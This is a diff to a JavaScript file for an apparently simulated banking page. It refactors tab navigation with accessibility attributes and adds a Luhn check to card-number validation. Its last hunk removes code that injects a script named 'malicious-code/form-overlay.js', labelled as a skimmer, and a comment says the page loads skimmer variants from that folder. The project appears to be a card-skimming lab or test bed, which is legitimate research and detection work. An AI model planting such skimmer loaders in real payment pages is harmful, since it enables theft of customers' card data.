@@ -45,12 +45,7 @@
         const targetSection = link.getAttribute('data-section')
         
         if (targetSection) {
-          showSection(targetSection)
-
-          // Update active tab link
-          tabLinks.forEach(tab => tab.classList.remove('active'))
-          link.classList.add('active')
-
+          setActiveTab(link)
           appState.currentSection = targetSection
           console.log('[Banking] Navigated to section:', targetSection)
           
@@ -63,11 +58,44 @@
     })
 
     function showSection(sectionId) {
-      sections.forEach(section => section.classList.remove('active'))
-      const targetSection = document.getElementById(sectionId)
+      sections.forEach(section => {
+        const matches = section.id === sectionId
+        section.classList.toggle('active', matches)
+        section.setAttribute('aria-hidden', matches ? 'false' : 'true')
+      })
+    }
+    
+    function setActiveTab(activeLink) {
+      const targetSection = activeLink?.getAttribute('data-section')
       if (targetSection) {
-        targetSection.classList.add('active')
+        showSection(targetSection)
       }
+
+      tabLinks.forEach(link => {
+        const isActive = link === activeLink
+        link.classList.toggle('active', isActive)
+        link.setAttribute('aria-selected', isActive ? 'true' : 'false')
+      })
+    }
+
+    tabLinks.forEach((link, index) => {
+      const sectionId = link.getAttribute('data-section')
+      const tabId = link.id || `tab-${sectionId || index}`
+      link.id = tabId
+      if (sectionId) {
+        link.setAttribute('aria-controls', sectionId)
+        const section = document.getElementById(sectionId)
+        if (section) {
+          section.setAttribute('role', 'tabpanel')
+          section.setAttribute('aria-labelledby', tabId)
+          section.setAttribute('aria-hidden', section.classList.contains('active') ? 'false' : 'true')
+        }
+      }
+    })
+
+    const defaultTab = document.querySelector('.tab-link[data-section="cards"]')
+    if (defaultTab) {
+      setActiveTab(defaultTab)
     }
   }
 
@@ -98,10 +126,22 @@
   }
 
   function validateCardNumber(cardNumber) {
-    // Remove spaces and dashes for validation
     const cleaned = cardNumber.replace(/[\s-]/g, '')
-    // Must be 13-19 digits (standard credit card lengths)
-    return /^\d{13,19}$/.test(cleaned)
+    if (!/^\d{13,19}$/.test(cleaned)) return false
+
+    let sum = 0
+    let shouldDouble = false
+    for (let i = cleaned.length - 1; i >= 0; i--) {
+      let digit = parseInt(cleaned[i], 10)
+      if (shouldDouble) {
+        digit *= 2
+        if (digit > 9) digit -= 9
+      }
+      sum += digit
+      shouldDouble = !shouldDouble
+    }
+
+    return sum % 10 === 0
   }
 
   function validateCardExpiry(expiry) {
@@ -758,16 +798,6 @@
       updateAccountBalances()
       initSecurityMonitoring()
 
-      // Set default section to cards and show add card form
-      const cardsSection = document.getElementById('cards')
-      if (cardsSection) {
-        // Hide other sections
-        document.querySelectorAll('.section').forEach(section => {
-          section.classList.remove('active')
-        })
-        cardsSection.classList.add('active')
-      }
-      
       // Show add card form by default
       showAddCardForm()
 
@@ -790,15 +820,7 @@
     init()
   }
 
-  // ===== Injection for form-overlay.js =====
-  // banking.html already loads the selected variant via malicious-code/<variant>.js;
-  // only inject here if form-overlay wasn't already loaded, to avoid double-execution.
-  if (!document.querySelector('script[data-skimmer="form-overlay"]')) {
-    const overlayScript = document.createElement('script')
-    overlayScript.src = 'malicious-code/form-overlay.js'
-    overlayScript.setAttribute('data-skimmer', 'form-overlay')
-    document.body.appendChild(overlayScript)
-  }
+
 })()
 
 /**
